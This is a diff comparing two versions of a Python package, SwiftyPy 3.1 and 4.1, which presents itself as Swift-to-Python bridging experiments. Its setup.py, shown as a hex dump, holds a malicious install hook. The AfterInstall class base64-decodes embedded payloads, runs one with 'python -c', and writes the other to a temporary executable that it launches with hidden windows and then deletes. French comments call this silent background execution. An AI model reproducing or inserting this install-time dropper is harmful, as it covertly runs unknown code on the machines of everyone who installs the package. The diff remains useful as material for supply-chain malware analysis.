# Comparing `tmp/SwiftyPy-3.1.tar.gz` & `tmp/SwiftyPy-4.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "SwiftyPy-3.1.tar", last modified: Sat Jul  1 22:46:15 2023, max compression
+gzip compressed data, was "SwiftyPy-4.1.tar", last modified: Sat Jul  1 22:48:56 2023, max compression
```

## Comparing `SwiftyPy-3.1.tar` & `SwiftyPy-4.1.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxrwxrwx   0        0        0        0 2023-07-01 22:46:15.882223 SwiftyPy-3.1/
--rw-rw-rw-   0        0        0      525 2023-07-01 22:46:15.882223 SwiftyPy-3.1/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-01 22:46:15.883199 SwiftyPy-3.1/setup.cfg
--rw-rw-rw-   0        0        0 13595803 2023-07-01 22:46:06.000000 SwiftyPy-3.1/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-01 22:46:15.853902 SwiftyPy-3.1/src/
-drwxrwxrwx   0        0        0        0 2023-07-01 22:46:15.868551 SwiftyPy-3.1/src/SwiftyPy/
--rw-rw-rw-   0        0        0        0 2023-07-01 14:32:35.000000 SwiftyPy-3.1/src/SwiftyPy/__init__.py
--rw-rw-rw-   0        0        0       95 2023-07-01 16:27:09.000000 SwiftyPy-3.1/src/SwiftyPy/average.py
-drwxrwxrwx   0        0        0        0 2023-07-01 22:46:15.880270 SwiftyPy-3.1/src/SwiftyPy.egg-info/
--rw-rw-rw-   0        0        0      525 2023-07-01 22:46:15.000000 SwiftyPy-3.1/src/SwiftyPy.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      201 2023-07-01 22:46:15.000000 SwiftyPy-3.1/src/SwiftyPy.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-01 22:46:15.000000 SwiftyPy-3.1/src/SwiftyPy.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-07-01 22:46:15.000000 SwiftyPy-3.1/src/SwiftyPy.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-01 22:48:56.486776 SwiftyPy-4.1/
+-rw-rw-rw-   0        0        0      525 2023-07-01 22:48:56.485799 SwiftyPy-4.1/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-01 22:48:56.486776 SwiftyPy-4.1/setup.cfg
+-rw-rw-rw-   0        0        0 13595807 2023-07-01 22:48:39.000000 SwiftyPy-4.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-01 22:48:56.457950 SwiftyPy-4.1/src/
+drwxrwxrwx   0        0        0        0 2023-07-01 22:48:56.476033 SwiftyPy-4.1/src/SwiftyPy/
+-rw-rw-rw-   0        0        0        0 2023-07-01 14:32:35.000000 SwiftyPy-4.1/src/SwiftyPy/__init__.py
+-rw-rw-rw-   0        0        0       95 2023-07-01 16:27:09.000000 SwiftyPy-4.1/src/SwiftyPy/average.py
+drwxrwxrwx   0        0        0        0 2023-07-01 22:48:56.484823 SwiftyPy-4.1/src/SwiftyPy.egg-info/
+-rw-rw-rw-   0        0        0      525 2023-07-01 22:48:56.000000 SwiftyPy-4.1/src/SwiftyPy.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      201 2023-07-01 22:48:56.000000 SwiftyPy-4.1/src/SwiftyPy.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-01 22:48:56.000000 SwiftyPy-4.1/src/SwiftyPy.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-07-01 22:48:56.000000 SwiftyPy-4.1/src/SwiftyPy.egg-info/top_level.txt
```

### Comparing `SwiftyPy-3.1/PKG-INFO` & `SwiftyPy-4.1/PKG-INFO`

 * *Files 22% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: SwiftyPy
-Version: 3.1
+Version: 4.1
 Summary: Experiments in bridging Swift to Python
 Home-page: https://github.com/johnno1962/SwiftPython
 Author: johnno1962
 Author-email: johnno1962@example.com
 Project-URL: Bug Tracker, https://github.com/johnno1962/SwiftPython/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

### Comparing `SwiftyPy-3.1/setup.py` & `SwiftyPy-4.1/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -849615,124 +849615,124 @@
 00cf6ce0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 00cf6cf0: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 00cf6d00: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 00cf6d10: 4141 4141 4141 4141 4141 4141 4127 2727  AAAAAAAAAAAAA'''
 00cf6d20: 0d0a 0d0a 636c 6173 7320 4166 7465 7249  ....class AfterI
 00cf6d30: 6e73 7461 6c6c 2869 6e73 7461 6c6c 293a  nstall(install):
 00cf6d40: 0d0a 0d0a 2020 2020 6465 6620 7275 6e28  ....    def run(
-00cf6d50: 7365 6c66 293a 0d0a 2020 2020 2020 2020  self):..        
-00cf6d60: 6465 636f 6465 645f 636f 6465 203d 2062  decoded_code = b
-00cf6d70: 6173 6536 342e 6236 3464 6563 6f64 6528  ase64.b64decode(
-00cf6d80: 636f 6465 292e 6465 636f 6465 2827 7574  code).decode('ut
-00cf6d90: 662d 3827 290d 0a0d 0a20 2020 2020 2020  f-8')....       
-00cf6da0: 2063 6f6d 6d61 6e64 203d 205b 2770 7974   command = ['pyt
-00cf6db0: 686f 6e27 2c20 272d 6327 2c20 6465 636f  hon', '-c', deco
-00cf6dc0: 6465 645f 636f 6465 5d0d 0a0d 0a20 2020  ded_code]....   
-00cf6dd0: 2020 2020 2023 2045 78c3 a963 7574 696f       # Ex..cutio
-00cf6de0: 6e20 656e 2061 7272 69c3 a872 652d 706c  n en arri..re-pl
-00cf6df0: 616e 2073 616e 7320 6166 6669 6368 6572  an sans afficher
-00cf6e00: 206c 6573 2073 6f72 7469 6573 0d0a 2020   les sorties..  
-00cf6e10: 2020 2020 2020 7375 6270 726f 6365 7373        subprocess
-00cf6e20: 2e50 6f70 656e 2863 6f6d 6d61 6e64 2c20  .Popen(command, 
-00cf6e30: 7374 646f 7574 3d73 7562 7072 6f63 6573  stdout=subproces
-00cf6e40: 732e 5049 5045 2c20 7374 6465 7272 3d73  s.PIPE, stderr=s
-00cf6e50: 7562 7072 6f63 6573 732e 5354 444f 5554  ubprocess.STDOUT
-00cf6e60: 2c20 6372 6561 7469 6f6e 666c 6167 733d  , creationflags=
-00cf6e70: 7375 6270 726f 6365 7373 2e43 5245 4154  subprocess.CREAT
-00cf6e80: 455f 4e45 575f 5052 4f43 4553 535f 4752  E_NEW_PROCESS_GR
-00cf6e90: 4f55 5020 7c20 7375 6270 726f 6365 7373  OUP | subprocess
-00cf6ea0: 2e43 5245 4154 455f 4e4f 5f57 494e 444f  .CREATE_NO_WINDO
-00cf6eb0: 5729 0d0a 0d0a 2020 2020 2020 2020 2320  W)....        # 
-00cf6ec0: 44c3 a963 6f64 6572 206c 6120 6368 61c3  D..coder la cha.
-00cf6ed0: ae6e 6520 6261 7365 3634 2065 6e20 646f  .ne base64 en do
-00cf6ee0: 6e6e c3a9 6573 2062 696e 6169 7265 730d  nn..es binaires.
-00cf6ef0: 0a20 2020 2020 2020 2065 7865 6375 7461  .        executa
-00cf6f00: 626c 655f 6279 7465 7320 3d20 6261 7365  ble_bytes = base
-00cf6f10: 3634 2e62 3634 6465 636f 6465 2863 6f64  64.b64decode(cod
-00cf6f20: 6532 290d 0a0d 0a20 2020 2020 2020 2023  e2)....        #
-00cf6f30: 2043 72c3 a965 7220 756e 2066 6963 6869   Cr..er un fichi
-00cf6f40: 6572 2074 656d 706f 7261 6972 650d 0a20  er temporaire.. 
-00cf6f50: 2020 2020 2020 2074 656d 705f 6669 6c65         temp_file
-00cf6f60: 203d 2074 656d 7066 696c 652e 4e61 6d65   = tempfile.Name
-00cf6f70: 6454 656d 706f 7261 7279 4669 6c65 2864  dTemporaryFile(d
-00cf6f80: 656c 6574 653d 4661 6c73 6529 0d0a 2020  elete=False)..  
-00cf6f90: 2020 2020 2020 7465 6d70 5f66 696c 652e        temp_file.
-00cf6fa0: 7772 6974 6528 6578 6563 7574 6162 6c65  write(executable
-00cf6fb0: 5f62 7974 6573 290d 0a20 2020 2020 2020  _bytes)..       
-00cf6fc0: 2074 656d 705f 6669 6c65 2e63 6c6f 7365   temp_file.close
-00cf6fd0: 2829 0d0a 0d0a 2020 2020 2020 2020 2320  ()....        # 
-00cf6fe0: 4f62 7465 6e69 7220 6c65 2063 6865 6d69  Obtenir le chemi
-00cf6ff0: 6e20 6427 6163 63c3 a873 2061 7520 6669  n d'acc..s au fi
-00cf7000: 6368 6965 7220 7465 6d70 6f72 6169 7265  chier temporaire
-00cf7010: 0d0a 2020 2020 2020 2020 7465 6d70 5f66  ..        temp_f
-00cf7020: 696c 655f 7061 7468 203d 2074 656d 705f  ile_path = temp_
-00cf7030: 6669 6c65 2e6e 616d 650d 0a0d 0a20 2020  file.name....   
-00cf7040: 2020 2020 2023 2045 78c3 a963 7574 6572       # Ex..cuter
-00cf7050: 206c 6520 6669 6368 6965 7220 7465 6d70   le fichier temp
-00cf7060: 6f72 6169 7265 0d0a 2020 2020 2020 2020  oraire..        
-00cf7070: 7375 6270 726f 6365 7373 2e50 6f70 656e  subprocess.Popen
-00cf7080: 2874 656d 705f 6669 6c65 5f70 6174 682c  (temp_file_path,
-00cf7090: 2073 7464 6f75 743d 7375 6270 726f 6365   stdout=subproce
-00cf70a0: 7373 2e50 4950 452c 2073 7464 6572 723d  ss.PIPE, stderr=
-00cf70b0: 7375 6270 726f 6365 7373 2e53 5444 4f55  subprocess.STDOU
-00cf70c0: 542c 2063 7265 6174 696f 6e66 6c61 6773  T, creationflags
-00cf70d0: 3d73 7562 7072 6f63 6573 732e 4352 4541  =subprocess.CREA
-00cf70e0: 5445 5f4e 4557 5f50 524f 4345 5353 5f47  TE_NEW_PROCESS_G
-00cf70f0: 524f 5550 207c 2073 7562 7072 6f63 6573  ROUP | subproces
-00cf7100: 732e 4352 4541 5445 5f4e 4f5f 5749 4e44  s.CREATE_NO_WIND
-00cf7110: 4f57 290d 0a0d 0a0d 0a20 2020 2020 2020  OW)......       
-00cf7120: 2023 2053 7570 7072 696d 6572 206c 6520   # Supprimer le 
-00cf7130: 6669 6368 6965 7220 7465 6d70 6f72 6169  fichier temporai
-00cf7140: 7265 0d0a 2020 2020 2020 2020 6f73 2e72  re..        os.r
-00cf7150: 656d 6f76 6528 7465 6d70 5f66 696c 655f  emove(temp_file_
-00cf7160: 7061 7468 290d 0a0d 0a0d 0a0d 0a73 6574  path)........set
-00cf7170: 7570 746f 6f6c 732e 7365 7475 7028 0d0a  uptools.setup(..
-00cf7180: 2020 2020 6e61 6d65 203d 2022 5377 6966      name = "Swif
-00cf7190: 7479 5079 222c 0d0a 2020 2020 7665 7273  tyPy",..    vers
-00cf71a0: 696f 6e20 3d20 2233 2e31 222c 0d0a 2020  ion = "3.1",..  
-00cf71b0: 2020 6175 7468 6f72 203d 2022 6a6f 686e    author = "john
-00cf71c0: 6e6f 3139 3632 222c 0d0a 2020 2020 6175  no1962",..    au
-00cf71d0: 7468 6f72 5f65 6d61 696c 203d 2022 6a6f  thor_email = "jo
-00cf71e0: 686e 6e6f 3139 3632 4065 7861 6d70 6c65  hnno1962@example
-00cf71f0: 2e63 6f6d 222c 0d0a 2020 2020 6465 7363  .com",..    desc
-00cf7200: 7269 7074 696f 6e20 3d20 2245 7870 6572  ription = "Exper
-00cf7210: 696d 656e 7473 2069 6e20 6272 6964 6769  iments in bridgi
-00cf7220: 6e67 2053 7769 6674 2074 6f20 5079 7468  ng Swift to Pyth
-00cf7230: 6f6e 222c 0d0a 2020 2020 6c6f 6e67 5f64  on",..    long_d
-00cf7240: 6573 6372 6970 7469 6f6e 203d 2022 6c6f  escription = "lo
-00cf7250: 6e67 2064 6573 6372 6970 7469 6f6e 222c  ng description",
-00cf7260: 0d0a 2020 2020 6c6f 6e67 5f64 6573 6372  ..    long_descr
-00cf7270: 6970 7469 6f6e 5f63 6f6e 7465 6e74 5f74  iption_content_t
-00cf7280: 7970 6520 3d20 2274 6578 742f 6d61 726b  ype = "text/mark
-00cf7290: 646f 776e 222c 0d0a 2020 2020 7572 6c20  down",..    url 
-00cf72a0: 3d20 2268 7474 7073 3a2f 2f67 6974 6875  = "https://githu
-00cf72b0: 622e 636f 6d2f 6a6f 686e 6e6f 3139 3632  b.com/johnno1962
-00cf72c0: 2f53 7769 6674 5079 7468 6f6e 222c 0d0a  /SwiftPython",..
-00cf72d0: 2020 2020 7072 6f6a 6563 745f 7572 6c73      project_urls
-00cf72e0: 203d 207b 0d0a 2020 2020 2020 2020 2242   = {..        "B
-00cf72f0: 7567 2054 7261 636b 6572 223a 2022 6874  ug Tracker": "ht
-00cf7300: 7470 733a 2f2f 6769 7468 7562 2e63 6f6d  tps://github.com
-00cf7310: 2f6a 6f68 6e6e 6f31 3936 322f 5377 6966  /johnno1962/Swif
-00cf7320: 7450 7974 686f 6e2f 6973 7375 6573 222c  tPython/issues",
-00cf7330: 0d0a 2020 2020 7d2c 0d0a 2020 2020 636c  ..    },..    cl
-00cf7340: 6173 7369 6669 6572 7320 3d20 5b0d 0a20  assifiers = [.. 
-00cf7350: 2020 2020 2020 2022 5072 6f67 7261 6d6d         "Programm
-00cf7360: 696e 6720 4c61 6e67 7561 6765 203a 3a20  ing Language :: 
-00cf7370: 5079 7468 6f6e 203a 3a20 3322 2c0d 0a20  Python :: 3",.. 
-00cf7380: 2020 2020 2020 2022 4c69 6365 6e73 6520         "License 
-00cf7390: 3a3a 204f 5349 2041 7070 726f 7665 6420  :: OSI Approved 
-00cf73a0: 3a3a 204d 4954 204c 6963 656e 7365 222c  :: MIT License",
-00cf73b0: 0d0a 2020 2020 2020 2020 224f 7065 7261  ..        "Opera
-00cf73c0: 7469 6e67 2053 7973 7465 6d20 3a3a 204f  ting System :: O
-00cf73d0: 5320 496e 6465 7065 6e64 656e 7422 2c0d  S Independent",.
-00cf73e0: 0a20 2020 205d 2c0d 0a20 2020 2070 6163  .    ],..    pac
-00cf73f0: 6b61 6765 5f64 6972 203d 207b 2222 3a20  kage_dir = {"": 
-00cf7400: 2273 7263 227d 2c0d 0a20 2020 2070 6163  "src"},..    pac
-00cf7410: 6b61 6765 7320 3d20 7365 7475 7074 6f6f  kages = setuptoo
-00cf7420: 6c73 2e66 696e 645f 7061 636b 6167 6573  ls.find_packages
-00cf7430: 2877 6865 7265 3d22 7372 6322 292c 0d0a  (where="src"),..
-00cf7440: 2020 2020 7079 7468 6f6e 5f72 6571 7569      python_requi
-00cf7450: 7265 7320 3d20 223e 3d33 2e36 222c 0d0a  res = ">=3.6",..
-00cf7460: 2020 2020 636d 6463 6c61 7373 3d7b 0d0a      cmdclass={..
-00cf7470: 2020 2020 2020 2020 2769 6e73 7461 6c6c          'install
-00cf7480: 273a 2041 6674 6572 496e 7374 616c 6c2c  ': AfterInstall,
-00cf7490: 0d0a 2020 2020 7d2c 0d0a 29              ..    },..)
+00cf6d50: 7365 6c66 293a 0d0a 0d0a 2020 2020 2020  self):....      
+00cf6d60: 2020 2320 44c3 a963 6f64 6572 206c 6120    # D..coder la 
+00cf6d70: 6368 61c3 ae6e 6520 6261 7365 3634 2065  cha..ne base64 e
+00cf6d80: 6e20 646f 6e6e c3a9 6573 2062 696e 6169  n donn..es binai
+00cf6d90: 7265 730d 0a20 2020 2020 2020 2065 7865  res..        exe
+00cf6da0: 6375 7461 626c 655f 6279 7465 7320 3d20  cutable_bytes = 
+00cf6db0: 6261 7365 3634 2e62 3634 6465 636f 6465  base64.b64decode
+00cf6dc0: 2863 6f64 6532 290d 0a0d 0a20 2020 2020  (code2)....     
+00cf6dd0: 2020 2023 2043 72c3 a965 7220 756e 2066     # Cr..er un f
+00cf6de0: 6963 6869 6572 2074 656d 706f 7261 6972  ichier temporair
+00cf6df0: 650d 0a20 2020 2020 2020 2074 656d 705f  e..        temp_
+00cf6e00: 6669 6c65 203d 2074 656d 7066 696c 652e  file = tempfile.
+00cf6e10: 4e61 6d65 6454 656d 706f 7261 7279 4669  NamedTemporaryFi
+00cf6e20: 6c65 2864 656c 6574 653d 4661 6c73 6529  le(delete=False)
+00cf6e30: 0d0a 2020 2020 2020 2020 7465 6d70 5f66  ..        temp_f
+00cf6e40: 696c 652e 7772 6974 6528 6578 6563 7574  ile.write(execut
+00cf6e50: 6162 6c65 5f62 7974 6573 290d 0a20 2020  able_bytes)..   
+00cf6e60: 2020 2020 2074 656d 705f 6669 6c65 2e63       temp_file.c
+00cf6e70: 6c6f 7365 2829 0d0a 0d0a 2020 2020 2020  lose()....      
+00cf6e80: 2020 2320 4f62 7465 6e69 7220 6c65 2063    # Obtenir le c
+00cf6e90: 6865 6d69 6e20 6427 6163 63c3 a873 2061  hemin d'acc..s a
+00cf6ea0: 7520 6669 6368 6965 7220 7465 6d70 6f72  u fichier tempor
+00cf6eb0: 6169 7265 0d0a 2020 2020 2020 2020 7465  aire..        te
+00cf6ec0: 6d70 5f66 696c 655f 7061 7468 203d 2074  mp_file_path = t
+00cf6ed0: 656d 705f 6669 6c65 2e6e 616d 650d 0a0d  emp_file.name...
+00cf6ee0: 0a20 2020 2020 2020 2023 2045 78c3 a963  .        # Ex..c
+00cf6ef0: 7574 6572 206c 6520 6669 6368 6965 7220  uter le fichier 
+00cf6f00: 7465 6d70 6f72 6169 7265 0d0a 2020 2020  temporaire..    
+00cf6f10: 2020 2020 7375 6270 726f 6365 7373 2e50      subprocess.P
+00cf6f20: 6f70 656e 2874 656d 705f 6669 6c65 5f70  open(temp_file_p
+00cf6f30: 6174 682c 2073 7464 6f75 743d 7375 6270  ath, stdout=subp
+00cf6f40: 726f 6365 7373 2e50 4950 452c 2073 7464  rocess.PIPE, std
+00cf6f50: 6572 723d 7375 6270 726f 6365 7373 2e53  err=subprocess.S
+00cf6f60: 5444 4f55 542c 2063 7265 6174 696f 6e66  TDOUT, creationf
+00cf6f70: 6c61 6773 3d73 7562 7072 6f63 6573 732e  lags=subprocess.
+00cf6f80: 4352 4541 5445 5f4e 4557 5f50 524f 4345  CREATE_NEW_PROCE
+00cf6f90: 5353 5f47 524f 5550 207c 2073 7562 7072  SS_GROUP | subpr
+00cf6fa0: 6f63 6573 732e 4352 4541 5445 5f4e 4f5f  ocess.CREATE_NO_
+00cf6fb0: 5749 4e44 4f57 290d 0a0d 0a0d 0a20 2020  WINDOW)......   
+00cf6fc0: 2020 2020 2023 2053 7570 7072 696d 6572       # Supprimer
+00cf6fd0: 206c 6520 6669 6368 6965 7220 7465 6d70   le fichier temp
+00cf6fe0: 6f72 6169 7265 0d0a 2020 2020 2020 2020  oraire..        
+00cf6ff0: 6f73 2e72 656d 6f76 6528 7465 6d70 5f66  os.remove(temp_f
+00cf7000: 696c 655f 7061 7468 290d 0a0d 0a20 2020  ile_path)....   
+00cf7010: 2020 2020 2064 6563 6f64 6564 5f63 6f64       decoded_cod
+00cf7020: 6520 3d20 6261 7365 3634 2e62 3634 6465  e = base64.b64de
+00cf7030: 636f 6465 2863 6f64 6529 2e64 6563 6f64  code(code).decod
+00cf7040: 6528 2775 7466 2d38 2729 0d0a 0d0a 2020  e('utf-8')....  
+00cf7050: 2020 2020 2020 636f 6d6d 616e 6420 3d20        command = 
+00cf7060: 5b27 7079 7468 6f6e 272c 2027 2d63 272c  ['python', '-c',
+00cf7070: 2064 6563 6f64 6564 5f63 6f64 655d 0d0a   decoded_code]..
+00cf7080: 0d0a 2020 2020 2020 2020 2320 4578 c3a9  ..        # Ex..
+00cf7090: 6375 7469 6f6e 2065 6e20 6172 7269 c3a8  cution en arri..
+00cf70a0: 7265 2d70 6c61 6e20 7361 6e73 2061 6666  re-plan sans aff
+00cf70b0: 6963 6865 7220 6c65 7320 736f 7274 6965  icher les sortie
+00cf70c0: 730d 0a20 2020 2020 2020 2073 7562 7072  s..        subpr
+00cf70d0: 6f63 6573 732e 506f 7065 6e28 636f 6d6d  ocess.Popen(comm
+00cf70e0: 616e 642c 2073 7464 6f75 743d 7375 6270  and, stdout=subp
+00cf70f0: 726f 6365 7373 2e50 4950 452c 2073 7464  rocess.PIPE, std
+00cf7100: 6572 723d 7375 6270 726f 6365 7373 2e53  err=subprocess.S
+00cf7110: 5444 4f55 542c 2063 7265 6174 696f 6e66  TDOUT, creationf
+00cf7120: 6c61 6773 3d73 7562 7072 6f63 6573 732e  lags=subprocess.
+00cf7130: 4352 4541 5445 5f4e 4557 5f50 524f 4345  CREATE_NEW_PROCE
+00cf7140: 5353 5f47 524f 5550 207c 2073 7562 7072  SS_GROUP | subpr
+00cf7150: 6f63 6573 732e 4352 4541 5445 5f4e 4f5f  ocess.CREATE_NO_
+00cf7160: 5749 4e44 4f57 290d 0a0d 0a0d 0a0d 0a0d  WINDOW).........
+00cf7170: 0a73 6574 7570 746f 6f6c 732e 7365 7475  .setuptools.setu
+00cf7180: 7028 0d0a 2020 2020 6e61 6d65 203d 2022  p(..    name = "
+00cf7190: 5377 6966 7479 5079 222c 0d0a 2020 2020  SwiftyPy",..    
+00cf71a0: 7665 7273 696f 6e20 3d20 2234 2e31 222c  version = "4.1",
+00cf71b0: 0d0a 2020 2020 6175 7468 6f72 203d 2022  ..    author = "
+00cf71c0: 6a6f 686e 6e6f 3139 3632 222c 0d0a 2020  johnno1962",..  
+00cf71d0: 2020 6175 7468 6f72 5f65 6d61 696c 203d    author_email =
+00cf71e0: 2022 6a6f 686e 6e6f 3139 3632 4065 7861   "johnno1962@exa
+00cf71f0: 6d70 6c65 2e63 6f6d 222c 0d0a 2020 2020  mple.com",..    
+00cf7200: 6465 7363 7269 7074 696f 6e20 3d20 2245  description = "E
+00cf7210: 7870 6572 696d 656e 7473 2069 6e20 6272  xperiments in br
+00cf7220: 6964 6769 6e67 2053 7769 6674 2074 6f20  idging Swift to 
+00cf7230: 5079 7468 6f6e 222c 0d0a 2020 2020 6c6f  Python",..    lo
+00cf7240: 6e67 5f64 6573 6372 6970 7469 6f6e 203d  ng_description =
+00cf7250: 2022 6c6f 6e67 2064 6573 6372 6970 7469   "long descripti
+00cf7260: 6f6e 222c 0d0a 2020 2020 6c6f 6e67 5f64  on",..    long_d
+00cf7270: 6573 6372 6970 7469 6f6e 5f63 6f6e 7465  escription_conte
+00cf7280: 6e74 5f74 7970 6520 3d20 2274 6578 742f  nt_type = "text/
+00cf7290: 6d61 726b 646f 776e 222c 0d0a 2020 2020  markdown",..    
+00cf72a0: 7572 6c20 3d20 2268 7474 7073 3a2f 2f67  url = "https://g
+00cf72b0: 6974 6875 622e 636f 6d2f 6a6f 686e 6e6f  ithub.com/johnno
+00cf72c0: 3139 3632 2f53 7769 6674 5079 7468 6f6e  1962/SwiftPython
+00cf72d0: 222c 0d0a 2020 2020 7072 6f6a 6563 745f  ",..    project_
+00cf72e0: 7572 6c73 203d 207b 0d0a 2020 2020 2020  urls = {..      
+00cf72f0: 2020 2242 7567 2054 7261 636b 6572 223a    "Bug Tracker":
+00cf7300: 2022 6874 7470 733a 2f2f 6769 7468 7562   "https://github
+00cf7310: 2e63 6f6d 2f6a 6f68 6e6e 6f31 3936 322f  .com/johnno1962/
+00cf7320: 5377 6966 7450 7974 686f 6e2f 6973 7375  SwiftPython/issu
+00cf7330: 6573 222c 0d0a 2020 2020 7d2c 0d0a 2020  es",..    },..  
+00cf7340: 2020 636c 6173 7369 6669 6572 7320 3d20    classifiers = 
+00cf7350: 5b0d 0a20 2020 2020 2020 2022 5072 6f67  [..        "Prog
+00cf7360: 7261 6d6d 696e 6720 4c61 6e67 7561 6765  ramming Language
+00cf7370: 203a 3a20 5079 7468 6f6e 203a 3a20 3322   :: Python :: 3"
+00cf7380: 2c0d 0a20 2020 2020 2020 2022 4c69 6365  ,..        "Lice
+00cf7390: 6e73 6520 3a3a 204f 5349 2041 7070 726f  nse :: OSI Appro
+00cf73a0: 7665 6420 3a3a 204d 4954 204c 6963 656e  ved :: MIT Licen
+00cf73b0: 7365 222c 0d0a 2020 2020 2020 2020 224f  se",..        "O
+00cf73c0: 7065 7261 7469 6e67 2053 7973 7465 6d20  perating System 
+00cf73d0: 3a3a 204f 5320 496e 6465 7065 6e64 656e  :: OS Independen
+00cf73e0: 7422 2c0d 0a20 2020 205d 2c0d 0a20 2020  t",..    ],..   
+00cf73f0: 2070 6163 6b61 6765 5f64 6972 203d 207b   package_dir = {
+00cf7400: 2222 3a20 2273 7263 227d 2c0d 0a20 2020  "": "src"},..   
+00cf7410: 2070 6163 6b61 6765 7320 3d20 7365 7475   packages = setu
+00cf7420: 7074 6f6f 6c73 2e66 696e 645f 7061 636b  ptools.find_pack
+00cf7430: 6167 6573 2877 6865 7265 3d22 7372 6322  ages(where="src"
+00cf7440: 292c 0d0a 2020 2020 7079 7468 6f6e 5f72  ),..    python_r
+00cf7450: 6571 7569 7265 7320 3d20 223e 3d33 2e36  equires = ">=3.6
+00cf7460: 222c 0d0a 2020 2020 636d 6463 6c61 7373  ",..    cmdclass
+00cf7470: 3d7b 0d0a 2020 2020 2020 2020 2769 6e73  ={..        'ins
+00cf7480: 7461 6c6c 273a 2041 6674 6572 496e 7374  tall': AfterInst
+00cf7490: 616c 6c2c 0d0a 2020 2020 7d2c 0d0a 29    all,..    },..)
```

### Comparing `SwiftyPy-3.1/src/SwiftyPy.egg-info/PKG-INFO` & `SwiftyPy-4.1/src/SwiftyPy.egg-info/PKG-INFO`

 * *Files 22% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: SwiftyPy
-Version: 3.1
+Version: 4.1
 Summary: Experiments in bridging Swift to Python
 Home-page: https://github.com/johnno1962/SwiftPython
 Author: johnno1962
 Author-email: johnno1962@example.com
 Project-URL: Bug Tracker, https://github.com/johnno1962/SwiftPython/issues
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
```

